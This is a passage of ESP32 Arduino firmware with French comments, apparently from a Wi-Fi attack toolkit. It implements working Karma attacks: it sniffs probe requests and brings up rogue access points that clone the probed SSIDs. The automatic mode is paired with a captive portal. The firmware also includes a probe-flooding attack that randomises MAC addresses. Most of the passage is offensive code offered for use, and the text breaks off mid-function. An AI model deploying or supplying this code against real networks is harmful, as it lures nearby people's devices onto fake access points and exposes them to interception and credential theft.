  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  static bool touchHandled = false;
  screenDebounce();

  if (millis() - lastKeyPressTime > debounceDelay) {
    // Détection de l'interaction tactile
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0 && !touchHandled) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());

      if (x < tft.width() / 3) {
        // Zone de gauche - Défilement vers le haut
        currentIndexKarma--;
        if (currentIndexKarma < 0) {
          currentIndexKarma = menuSizeKarma - 1; // Boucle retour à la fin si en dessous de zéro
        }
        stateChanged = true;
      } else if (x > 2 * (tft.width() / 3)) {
        // Zone de droite - Défilement vers le bas
        currentIndexKarma++;
        if (currentIndexKarma >= menuSizeKarma) {
          currentIndexKarma = 0; // Boucle retour au début si dépassé la fin
        }
        stateChanged = true;
      } else {
        // Zone centrale - Sélectionner l'élément actuel
        executeMenuItemKarma(currentIndexKarma);
        stateChanged = true;
      }

      lastKeyPressTime = millis();
      touchHandled = true;
    }

    // Réinitialisation de touchHandled si aucun toucher n'est détecté
    if (touch.zRaw == 0) {
      touchHandled = false;
    }
  }

  if (stateChanged) {
    // Ajustement de l'indice de départ pour l'affichage du menu si nécessaire
    menuStartIndexKarma = max(0, min(currentIndexKarma, menuSizeKarma - maxMenuDisplayKarma));
    drawMenuKarma();  // Redessiner le menu avec le nouvel indice sélectionné
  }
}

void drawMenuKarma() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextFont(1);
  tft.setTextSize(2);

  int lineHeight = 16;
  int startX = 0;
  int startY = 6;

  for (int i = 0; i < maxMenuDisplayKarma; i++) {
    int menuIndexKarma = menuStartIndexKarma + i;
    if (menuIndexKarma >= menuSizeKarma) break;

    int posY = startY + i * lineHeight;

    if (menuIndexKarma == currentIndexKarma) {
      tft.fillRect(0, posY, tft.width(), lineHeight, menuSelectedBackgroundColor);
      tft.setTextColor(menuTextFocusedColor, menuSelectedBackgroundColor);
    } else {
      tft.fillRect(0, posY, tft.width(), lineHeight, TFT_BLACK);
      tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    }

    int offsetY = (lineHeight - 16) / 2;
    tft.setCursor(startX, posY + offsetY);
    tft.println(ssidsKarma[menuIndexKarma]);
  }
}

void executeMenuItemKarma(int indexKarma) {
  if (indexKarma >= 0 && indexKarma < ssid_count_Karma) {
    startAPWithSSIDKarma(ssidsKarma[indexKarma]);
  } else {
    tft.fillScreen(TFT_BLACK);
    tft.println("Selection invalide!");
    delay(1000);
    drawStartButtonKarma();
    currentStateKarma = StartScanKarma;
  }
}

void startAPWithSSIDKarma(const char* ssid) {
  clonedSSID = String(ssid);
  isProbeKarmaAttackMode = true;
  readConfigFile("/config/config.txt");
  createCaptivePortal();

  Serial.println("-------------------");
  Serial.println("Karma Attack started for : " + String(ssid));
  Serial.println("-------------------");

  tft.fillScreen(TFT_BLACK);
  unsigned long startTime = millis();
  unsigned long currentTime;
  int remainingTime;
  int clientCount = 0;
  int scanTimeKarma = 60; // Scan time for karma attack
  screenDebounce();

  while (true) {
    handleDnsRequestSerial();
    currentTime = millis();
    remainingTime = scanTimeKarma - ((currentTime - startTime) / 1000);
    clientCount = WiFi.softAPgetStationNum();
    tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);
    tft.setTextSize(2);

    int screenHeight = 240;
    int lineHeight = 16;
    int margin = (screenHeight - (3 * lineHeight)) / 4;

    int ssidY = margin;
    int ssidX = (320 - tft.textWidth(ssid)) / 2;
    tft.setCursor(ssidX, ssidY);
    tft.println(String(ssid));

    String timeText = "Left Time: " + String(remainingTime) + " s  ";
    int timeTextY = ssidY + lineHeight + margin;
    int timeTextX = (320 - tft.textWidth(timeText)) / 2;
    tft.setCursor(timeTextX, timeTextY);
    tft.println(timeText);

    String clientText = "Connected Client: " + String(clientCount);
    int clientTextY = timeTextY + lineHeight + margin;
    int clientTextX = (320 - tft.textWidth(clientText)) / 2;
    tft.setCursor(clientTextX, clientTextY);
    tft.println(clientText);

    // Dimensions du bouton
    int buttonWidth = 80;  // Largeur du bouton
    int buttonHeight = 30; // Hauteur du bouton
    int buttonX = (320 - buttonWidth) / 2; // Centrage horizontal
    int buttonY = 240 - buttonHeight - 10; // Positionné 10 pixels au-dessus du bord inférieur

    // Dessiner le bouton Stop
    tft.fillRoundRect(buttonX, buttonY, buttonWidth, buttonHeight, 5, TFT_RED); // Bouton rouge avec coins arrondis
    tft.setTextColor(TFT_WHITE, TFT_RED); // Texte blanc sur fond rouge
    tft.setCursor(buttonX + (buttonWidth - tft.textWidth("STOP")) / 2, buttonY + (buttonHeight - 16) / 2);
    tft.println("STOP");


    // Logs sur le port série
    Serial.println("---Karma-Attack---");
    Serial.println("On :" + String(ssid));
    Serial.println("Left Time: " + String(remainingTime) + "s");
    Serial.println("Connected Client: " + String(clientCount));
    Serial.println("-------------------");


    // Détection tactile pour arrêter
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (y > tft.height() / 2 && x > tft.width() / 3 && x < 2 * (tft.width() / 3)) {
        // Zone centrale de la partie inférieure de l'écran pour arrêter
        break;
      }
    }

    // Vérifier la fin du temps
    if (remainingTime <= 0) {
      break;
    }
    delay(200);
  }
  tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);

  // Résultat après arrêt ou fin de la durée
  tft.fillScreen(TFT_BLACK);
  tft.setCursor(15, tft.height() / 2);
  if (clientCount > 0) {
    tft.println("Karma Successful!!!");
    Serial.println("-------------------");
    Serial.println("Karma Attack worked !");
    Serial.println("-------------------");
  } else {
    tft.println(" Karma Failed...");
    Serial.println("-------------------");
    Serial.println("Karma Attack failed...");
    Serial.println("-------------------");
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
  }
  delay(2000);

  // Confirmation de sauvegarde
  if (confirmPopup("Save " + String(ssid) + " ?")) {
    saveSSIDToFile(ssid);
  }

  // Réinitialisation de l’état
  lastIndex = -1;
  inMenu = true;
  isProbeKarmaAttackMode = false;
  currentStateKarma = StartScanKarma;
  memset(ssidsKarma, 0, sizeof(ssidsKarma));
  ssid_count_Karma = 0;
  drawMenu();
}


void listProbes() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    Serial.println("No probes found");
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15; // Hauteur de ligne pour l'affichage des SSIDs
  const int maxDisplay = 9; // Nombre maximum de lignes affichables
  int currentListIndex = 0;
  bool needDisplayUpdate = true;

  unsigned long lastTouchTime = 0;
  const unsigned long debounceDelay = 200; // Temps en millisecondes pour ignorer les pressions supplémentaires
  screenDebounce();

  while (true) {
    handleDnsRequestSerial();

    if (millis() - lastTouchTime > debounceDelay) {
      // Lecture de l'écran tactile
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());
        int y = map(touch.yRaw, minY, maxY, 0, tft.height());

        if (y > tft.height() / 2) {
          if (x < tft.width() / 3) {
            // Zone gauche - naviguer vers le haut
            currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else if (x > 2 * (tft.width() / 3)) {
            // Zone droite - naviguer vers le bas
            currentListIndex = (currentListIndex + 1) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else {
            // Zone centrale - valider la sélection
            Serial.println("SSID selected: " + probes[currentListIndex]);
            clonedSSID = probes[currentListIndex];
            waitAndReturnToMenu(probes[currentListIndex] + " selected");
            return; // Sortie de la fonction après sélection
          }
        }
      }
    }

    if (needDisplayUpdate) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);
      int y = 1; // Début de l'affichage en y

      for (int i = 0; i < maxDisplay; i++) {
        int probeIndex = (currentListIndex + i) % numProbes;
        if (i == 0) { // Mettre en évidence la sonde actuellement sélectionnée
          tft.fillRect(0, y, tft.width(), lineHeight, menuSelectedBackgroundColor);
          tft.setTextColor(menuTextFocusedColor);
        } else {
          tft.setTextColor(menuTextUnFocusedColor);
        }
        tft.setCursor(0, y);
        tft.println(probes[probeIndex]);
        y += lineHeight;
      }

      needDisplayUpdate = false;
    }
  }
}



bool isProbePresent(String probes[], int numProbes, String probe) {
  for (int i = 0; i < numProbes; i++) {
    if (probes[i] == probe) {
      return true;
    }
  }
  return false;
}



void deleteProbe() {
  File file = SD.open("/probes.txt", FILE_READ);
  if (!file) {
    Serial.println("Failed to open probes.txt");
    waitAndReturnToMenu("Failed to open probes.txt");
    return;
  }

  String probes[MAX_SSIDS_Karma];
  int numProbes = 0;

  while (file.available() && numProbes < MAX_SSIDS_Karma) {
    String line = file.readStringUntil('\n');
    line.trim();
    if (line.length() > 0) {
      probes[numProbes++] = line;
    }
  }
  file.close();

  if (numProbes == 0) {
    waitAndReturnToMenu("No probes found");
    return;
  }

  const int lineHeight = 15;
  const int maxDisplay = 8;
  int currentListIndex = 0;
  bool needDisplayUpdate = true;

  unsigned long lastTouchTime = 0;
  const unsigned long debounceDelay = 200; // Temps pour ignorer les pressions supplémentaires
  screenDebounce();

  while (true) {
    handleDnsRequestSerial();

    if (millis() - lastTouchTime > debounceDelay) {
      // Lecture de l'écran tactile
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());
        int y = map(touch.yRaw, minY, maxY, 0, tft.height());

        if (y > tft.height() / 2) {
          if (x < tft.width() / 3) {
            // Zone gauche - naviguer vers le haut
            currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else if (x > 2 * (tft.width() / 3)) {
            // Zone droite - naviguer vers le bas
            currentListIndex = (currentListIndex + 1) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else {
            // Zone centrale - valider la suppression
            if (confirmPopup("Delete " + probes[currentListIndex] + " probe?")) {
              bool success = removeProbeFromFile("/probes.txt", probes[currentListIndex]);
              if (success) {
                Serial.println(probes[currentListIndex] + " deleted");
                waitAndReturnToMenu(probes[currentListIndex] + " deleted");
              } else {
                waitAndReturnToMenu("Error deleting probe");
              }
            } else {
              waitAndReturnToMenu("Return to menu");
            }
            return; // Sortie de la fonction après gestion de la suppression
          }
        }
      }
    }

    if (needDisplayUpdate) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);

      for (int i = 0; i < maxDisplay && i + currentListIndex < numProbes; i++) {
        int probeIndex = currentListIndex + i;
        String ssid = probes[probeIndex];
        ssid = ssid.substring(0, min(ssid.length(), (unsigned int)21));  // Tronquer pour l'affichage
        tft.setCursor(0, i * lineHeight + 10);
        tft.setTextColor(probeIndex == currentListIndex ? menuTextFocusedColor : menuTextUnFocusedColor);
        tft.println(ssid);
      }


      needDisplayUpdate = false;
    }
  }
}



int showProbesAndSelect(String probes[], int numProbes) {
  const int lineHeight = 18;  // Hauteur de ligne pour l'affichage
  const int maxDisplay = (128 - 10) / lineHeight;  // Nombre maximal de lignes affichables
  int currentListIndex = 0;  // Index de l'élément actuel dans la liste
  int selectedIndex = -1;  // -1 signifie aucune sélection
  bool needDisplayUpdate = true;

  unsigned long lastTouchTime = 0;
  const unsigned long debounceDelay = 200; // Temps pour ignorer les pressions supplémentaires

  while (selectedIndex == -1) {
    handleDnsRequestSerial();

    if (millis() - lastTouchTime > debounceDelay) {
      // Lecture de l'écran tactile
      TouchPoint touch = ts.getTouch();
      if (touch.zRaw != 0) {
        int x = map(touch.xRaw, minX, maxX, 0, tft.width());
        int y = map(touch.yRaw, minY, maxY, 0, tft.height());

        if (y > tft.height() / 2) {  // Contrôles tactiles uniquement sur la moitié inférieure
          if (x < tft.width() / 3) {
            // Zone gauche - naviguer vers le haut
            currentListIndex = (currentListIndex - 1 + numProbes) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else if (x > 2 * (tft.width() / 3)) {
            // Zone droite - naviguer vers le bas
            currentListIndex = (currentListIndex + 1) % numProbes;
            needDisplayUpdate = true;
            lastTouchTime = millis();
          } else {
            // Zone centrale - valider la sélection
            selectedIndex = currentListIndex;
            lastTouchTime = millis();
          }
        }
      }
    }

    if (needDisplayUpdate) {
      tft.fillScreen(TFT_BLACK);
      tft.setTextSize(2);

      for (int i = 0; i < maxDisplay && currentListIndex + i < numProbes; i++) {
        int displayIndex = currentListIndex + i;
        tft.setCursor(10, i * lineHeight + 10);
        tft.setTextColor(displayIndex == currentListIndex ? menuTextFocusedColor : menuTextUnFocusedColor);  // Mettre en surbrillance l'élément sélectionné
        tft.println(probes[displayIndex]);
      }


      needDisplayUpdate = false;
    }
  }

  return selectedIndex;
}



bool removeProbeFromFile(const char* filepath, const String & probeToRemove) {
  File originalFile = SD.open(filepath, FILE_READ);
  if (!originalFile) {
    Serial.println("Failed to open the original file for reading");
    return false;
  }

  const char* tempFilePath = "/temp.txt";
  File tempFile = SD.open(tempFilePath, FILE_WRITE);
  if (!tempFile) {
    Serial.println("Failed to open the temp file for writing");
    originalFile.close();
    return false;
  }

  bool probeRemoved = false;
  while (originalFile.available()) {
    String line = originalFile.readStringUntil('\n');
    if (line.endsWith("\r")) {
      line = line.substring(0, line.length() - 1);
    }

    if (!probeRemoved && line == probeToRemove) {
      probeRemoved = true;
    } else {
      tempFile.println(line);
    }
  }

  originalFile.close();
  tempFile.close();

  SD.remove(filepath);
  SD.rename(tempFilePath, filepath);

  return probeRemoved;
}

void deleteAllProbes() {
  if (confirmPopup("Delete All Probes ?")) {
    File file = SD.open("/probes.txt", FILE_WRITE);
    if (file) {
      file.close();
      waitAndReturnToMenu("Deleted successfully");
      Serial.println("-------------------");
      Serial.println("Probes deleted successfully");
      Serial.println("-------------------");
    } else {
      waitAndReturnToMenu("Error..");
      Serial.println("-------------------");
      Serial.println("Error opening file for deletion");
      Serial.println("-------------------");
    }
  } else {
    waitAndReturnToMenu("Deletion cancelled");
  }
}

//KARMA-PART-FUNCTIONS-END









//probe attack


uint8_t originalMAC[6];

void saveOriginalMAC() {
  esp_wifi_get_mac(WIFI_IF_STA, originalMAC);
}

void restoreOriginalMAC() {
  esp_wifi_set_mac(WIFI_IF_STA, originalMAC);
}

String generateRandomSSID(int length) {
  const char charset[] = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
  String randomString;
  for (int i = 0; i < length; i++) {
    int index = random(0, sizeof(charset) - 1);
    randomString += charset[index];
  }
  return randomString;
}

String generateRandomMAC() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_STA() {
  String mac = generateRandomMAC();
  uint8_t macArray[6];
  sscanf(mac.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArray[0], &macArray[1], &macArray[2], &macArray[3], &macArray[4], &macArray[5]);
  esp_wifi_set_mac(WIFI_IF_STA, macArray);
  delay(50);
}



std::vector<String> readCustomProbes(const char* filename) {
  File file = SD.open(filename, FILE_READ);
  std::vector<String> customProbes;

  if (!file) {
    Serial.println("Failed to open file for reading");
    return customProbes;
  }

  while (file.available()) {
    String line = file.readStringUntil('\n');
    if (line.startsWith("CustomProbes=")) {
      String probesStr = line.substring(String("CustomProbes=").length());
      int idx = 0;
      while ((idx = probesStr.indexOf(',')) != -1) {
        customProbes.push_back(probesStr.substring(0, idx));
        probesStr = probesStr.substring(idx + 1);
      }
      if (probesStr.length() > 0) {
        customProbes.push_back(probesStr);
      }
      break;
    }
  }
  file.close();
  return customProbes;
}



int checkNb = 0;
bool useCustomProbes;
std::vector<String> customProbes;

void probeAttack() {
  tft.fillScreen(TFT_BLACK);
  tft.setTextSize(2);
  tft.setTextColor(TFT_WHITE, TFT_BLACK);
  isProbeAttackRunning = true;
  useCustomProbes = false;

  // Demander l'utilisation de probes personnalisées
  if (!isItSerialCommand) {
    useCustomProbes = confirmPopup("Use custom probes?");
    tft.fillScreen(TFT_BLACK);
    if (useCustomProbes) {
      customProbes = readCustomProbes("/config/config.txt");
    } else {
      customProbes.clear();
    }
  } else {
    tft.fillScreen(TFT_BLACK);
    isItSerialCommand = false;
    customProbes.clear();
  }

  int probeCount = 0;
  int delayTime = 500; // Délai initial entre les probes
  unsigned long previousMillis = 0;
  const int debounceDelay = 200;
  unsigned long lastDebounceTime = 0;

  // Afficher la zone d'arrêt
  tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
  tft.setCursor(tft.width() / 2 - 24, tft.height() - 20);
  tft.setTextColor(TFT_WHITE, TFT_RED);
  tft.println("Stop");
  tft.setTextColor(TFT_WHITE, TFT_BLACK);

  // Afficher le texte de l'attaque
  int probesTextX = 0;
  String probesText = "Probe Attack running...";
  tft.setCursor(probesTextX, 37);
  tft.println(probesText);
  probesText = "Probes sent: ";
  tft.setCursor(probesTextX, 52);
  tft.print(probesText);

  Serial.println("-------------------");
  Serial.println("Starting Probe Attack");
  Serial.println("-------------------");

  while (isProbeAttackRunning) {
    unsigned long currentMillis = millis();
    handleDnsRequestSerial();
    if (currentMillis - previousMillis >= delayTime) {
      previousMillis = currentMillis;
      setRandomMAC_STA();
      setNextWiFiChannel();
      String ssid;

      if (!customProbes.empty()) {
        ssid = customProbes[probeCount % customProbes.size()];
      } else {
        ssid = generateRandomSSID(32);
      }

      WiFi.begin(ssid.c_str(), "");

      tft.setCursor(probesTextX + 12, 67);
      tft.fillRect(probesTextX + 12, 67, 40, 15, TFT_BLACK);
      tft.print(++probeCount);

      Serial.println("Probe sent: " + ssid);
    }

    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());
      if (y > tft.height() - 30 && x >= 0 && x <= tft.width()) {
        isProbeAttackRunning = false;
      }
    }
  }

  Serial.println("-------------------");
  Serial.println("Stopping Probe Attack");
  Serial.println("-------------------");
  restoreOriginalWiFiSettings();
  useCustomProbes = false;
  inMenu = true;
  drawMenu();
}


// Auto karma
bool isAPDeploying = false;

void startAutoKarma() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_stop();
  esp_wifi_set_promiscuous_rx_cb(NULL);
  esp_wifi_deinit();
  delay(300); // Petite pause pour s'assurer que tout est terminé
  wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
  esp_wifi_init(&cfg);
  esp_wifi_start();
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

  isAutoKarmaActive = true;
  Serial.println("-------------------");
  Serial.println("Karma Auto Attack Started....");
  Serial.println("-------------------");

  readConfigFile("/config/config.txt");
  createCaptivePortal();
  WiFi.softAPdisconnect(true);
  loopAutoKarma();
  esp_wifi_set_promiscuous(false);
}


void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT || isAPDeploying) return;

  const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
  const uint8_t *frame = packet->payload;
  const uint8_t frame_type = frame[0];

  if (frame_type == 0x40) {
    uint8_t ssid_length_Karma_Auto = frame[25];
    if (ssid_length_Karma_Auto >= 1 && ssid_length_Karma_Auto <= 32) {
      char tempSSID[33];
      memset(tempSSID, 0, sizeof(tempSSID));
      for (int i = 0; i < ssid_length_Karma_Auto; i++) {
        tempSSID[i] = (char)frame[26 + i];
      }
      tempSSID[ssid_length_Karma_Auto] = '\0';
      memset(lastSSID, 0, sizeof(lastSSID));
      strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
      newSSIDAvailable = true;
    }
  }
}



bool readConfigFile(const char* filename) {
  whitelist.clear();
  File configFile = SD.open(filename);
  if (!configFile) {
    Serial.println("Failed to open config file");
    return false;
  }

  while (configFile.available()) {
    String line = configFile.readStringUntil('\n');
    if (line.startsWith("KarmaAutoWhitelist=")) {
      int startIndex = line.indexOf('=') + 1;
      String ssidList = line.substring(startIndex);
      if (!ssidList.length()) {
        break;
      }
      int lastIndex = 0, nextIndex;
      while ((nextIndex = ssidList.indexOf(',', lastIndex)) != -1) {
        whitelist.push_back(ssidList.substring(lastIndex, nextIndex).c_str());
        lastIndex = nextIndex + 1;
      }
      whitelist.push_back(ssidList.substring(lastIndex).c_str());
    }
  }
  configFile.close();
  return true;
}

bool isSSIDWhitelisted(const char* ssid) {
  for (const auto& wssid : whitelist) {
    if (wssid == ssid) {
      return true;
    }
  }
  return false;
}


uint8_t originalMACKarma[6];

void saveOriginalMACKarma() {
  esp_wifi_get_mac(WIFI_IF_AP, originalMACKarma);
}

void restoreOriginalMACKarma() {
  esp_wifi_set_mac(WIFI_IF_AP, originalMACKarma);
}

String generateRandomMACKarma() {
  uint8_t mac[6];
  for (int i = 0; i < 6; ++i) {
    mac[i] = random(0x00, 0xFF);
  }
  // Force unicast byte
  mac[0] &= 0xFE;

  char macStr[18];
  snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}

void setRandomMAC_APKarma() {

  esp_wifi_stop();

  wifi_mode_t currentMode;
  esp_wifi_get_mode(&currentMode);
  if (currentMode != WIFI_MODE_AP && currentMode != WIFI_MODE_APSTA) {
    esp_wifi_set_mode(WIFI_MODE_AP);
  }

  String macKarma = generateRandomMACKarma();
  uint8_t macArrayKarma[6];
  sscanf(macKarma.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &macArrayKarma[0], &macArrayKarma[1], &macArrayKarma[2], &macArrayKarma[3], &macArrayKarma[4], &macArrayKarma[5]);

  esp_err_t ret = esp_wifi_set_mac(WIFI_IF_AP, macArrayKarma);
  if (ret != ESP_OK) {
    Serial.print("Error setting MAC: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }

  ret = esp_wifi_start();
  if (ret != ESP_OK) {
    Serial.print("Error starting WiFi: ");
    Serial.println(ret);
    esp_wifi_set_mode(currentMode);
    return;
  }
}



String getMACAddress() {
  uint8_t mac[6];
  esp_wifi_get_mac(WIFI_IF_AP, mac);
  char macStr[18];
  sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
  return String(macStr);
}




void loopAutoKarma() {
  while (isAutoKarmaActive) {
    // Contrôle de l'arrêt via l'écran tactile
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      // Zone centrale dans la moitié inférieure pour arrêter l'attaque Auto Karma
      if (y > tft.height() / 2 && x > tft.width() / 3 && x < 2 * (tft.width() / 3)) {
        isAutoKarmaActive = false;
        isAPDeploying = false;
        isInitialDisplayDone = false;
        inMenu = true;
        memset(lastSSID, 0, sizeof(lastSSID));
        memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
        newSSIDAvailable = false;
        esp_wifi_set_promiscuous(false);

        Serial.println("-------------------");
        Serial.println("Karma Auto Attack Stopped....");
        Serial.println("-------------------");
        break;
      }
    }

    // Activation de l'AP pour le nouveau SSID détecté
    if (newSSIDAvailable) {
      newSSIDAvailable = false;
      activateAPForAutoKarma(lastSSID);  // Active l'AP pour le SSID détecté
      isWaitingForProbeDisplayed = false;
    } else {
      // Affichage en attente de nouveaux probes
      if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
        displayWaitingForProbe();

        Serial.println("-------------------");
        Serial.println("Waiting for probe....");
        Serial.println("-------------------");

        isWaitingForProbeDisplayed = true;
      }
    }

    delay(100);
  }

  // Nettoyage après la fin du mode Auto Karma
  memset(lastSSID, 0, sizeof(lastSSID));
  newSSIDAvailable = false;
  isWaitingForProbeDisplayed = false;
  isInitialDisplayDone = false;
  inMenu = true;
  drawMenu();
}

void activateAPForAutoKarma(const char* ssid) {
  if (isSSIDWhitelisted(ssid)) {
    Serial.println("-------------------");
    Serial.println("SSID in the whitelist, skipping : " + String(ssid));
    Serial.println("-------------------");
    return;
  }
  if (strcmp(ssid, lastDeployedSSID) == 0) {
    Serial.println("-------------------");
    Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
    Serial.println("-------------------");
    return;
  }

  isAPDeploying = true;
  isInitialDisplayDone = false;
  if (captivePortalPassword == "") {
    WiFi.softAP(ssid);
  } else {
    WiFi.softAP(ssid , captivePortalPassword.c_str());
  }
  DNSServer dnsServer;
  WebServer server(80);

  Serial.println("-------------------");
  Serial.println("Starting Karma AP for : " + String(ssid));
  Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s" );
  Serial.println("-------------------");
  unsigned long startTime = millis();

  while (millis() - startTime < autoKarmaAPDuration) {
    displayAPStatus(ssid, startTime, autoKarmaAPDuration);
    dnsServer.processNextRequest();
    server.handleClient();

    // Gestion de l'écran tactile pour arrêter l'AP
    TouchPoint touch = ts.getTouch();
    if (touch.zRaw != 0) {
      int x = map(touch.xRaw, minX, maxX, 0, tft.width());
      int y = map(touch.yRaw, minY, maxY, 0, tft.height());

      if (y > tft.height() / 2 && x > tft.width() / 3 && x < 2 * (tft.width() / 3)) {
        // Zone centrale de la moitié inférieure - arrêt de l'AP
        memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
        break;
      }
    }

    int clientCount = WiFi.softAPgetStationNum();
    if (clientCount > 0) {
      clonedSSID = String(ssid);
      isAPDeploying = false;
      isAutoKarmaActive = false;
      isInitialDisplayDone = false;
      Serial.println("-------------------");
      Serial.println("Karma Successful for : " + String(clonedSSID));
      Serial.println("-------------------");
      memset(lastSSID, 0, sizeof(lastSSID));
      newSSIDAvailable = false;
      tft.fillScreen(menuBackgroundColor);
      tft.setCursor(0 , 32);
      tft.println("Karma Successful !!!");
      tft.setCursor(0 , 48);
      tft.println("On : " + clonedSSID);
      delay(7000);
      WiFi.softAPdisconnect(true);
      karmaSuccess = true;
      return;
    }

    delay(100);
  }
  strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1);

  WiFi.softAPdisconnect(true);
  isAPDeploying = false;
  isWaitingForProbeDisplayed = false;

  newSSIDAvailable = false;
  isInitialDisplayDone = false;
  Serial.println("-------------------");
  Serial.println("Karma Fail for : " + String(ssid));
  Serial.println("-------------------");
}


void displayWaitingForProbe() {
  tft.setCursor(0, 0);
  if (!isWaitingForProbeDisplayed) {
    tft.fillScreen(menuBackgroundColor);  // Effacer l'écran avec la couleur de fond du menu
    tft.setTextSize(2);
    tft.setTextColor(menuTextUnFocusedColor);

    // Affichage du bouton "Stop Auto" en bas de l'écran
    tft.fillRect(0, tft.height() - 30, tft.width(), 30, TFT_RED);
    tft.setCursor(tft.width() / 2 - 54, tft.height() - 20);
    tft.println("Stop Auto");

    // Affichage du texte "Waiting for probe" au centre de l'écran
    tft.setCursor(0, tft.height() / 2 - 20);
    tft.print("Waiting for probe");

    isWaitingForProbeDisplayed = true;
  }

  unsigned long currentTime = millis();
  if (currentTime - lastProbeDisplayUpdate > 1000) {
    lastProbeDisplayUpdate = currentTime;
    probeDisplayState = (probeDisplayState + 1) % 4;

    // Calcul de la position X pour l'animation des points
    int textWidth = tft.textWidth("Waiting for probe ");
    int x = textWidth;
    int y = tft.height() / 2 - 20;

    // Effacement de la zone des points d'animation
    tft.fillRect(x, y, tft.textWidth("..."), tft.fontHeight(), menuBackgroundColor);

    tft.setCursor(x, y);
    for (int i = 0; i < probeDisplayState; i++) {
      tft.print(".");
    }
  }

  // Détection tactile pour le bouton "Stop Auto"
  TouchPoint touch = ts.getTouch();
  if (touch.zRaw != 0) {
    int x = map(touch.xRaw, minX, maxX, 0, tft.width());
    int y = map(touch.yRaw, minY, maxY, 0, tft.height());

    if (y > tft.height() - 30) {  // Zone "Stop Auto" en bas
      isWaitingForProbeDisplayed = false;
      tft.fillScreen(menuBackgroundColor);
      waitAndReturnToMenu("Auto Stop Requested");
    }
  }
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
  unsigned long currentTime = millis();
  int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
  int clientCount = WiFi.softAPgetStationNum();

  tft.setTextSize(2);
  tft.setCursor(0, 0);

  if (!isInitialDisplayDone) {
    tft.fillScreen(menuBackgroundColor);  // Effacer l'écran avec la couleur de fond
    tft.setTextColor(menuTextUnFocusedColor, TFT_BLACK);


    // Affichage du SSID
    tft.setCursor(0, 10);
    tft.println(String(ssid));

    // Affichage des libellés "Left Time" et "Connected Client"
    tft.setCursor(0, 30);
    tft.print("Left Time: ");
    tft.setCursor(0, 50);
    tft.print("Connected Client: ");

    // Affichage du bouton "Stop" en bas
    tft.setCursor(tft.width() / 2 - 20, tft.height() - 70);
    tft.println("Next");
    
    // Affichage du bouton "Stop" en bas
    tft.setCursor(tft.width() / 2 - 20, tft.height() - 20);
    tft.println("Stop");

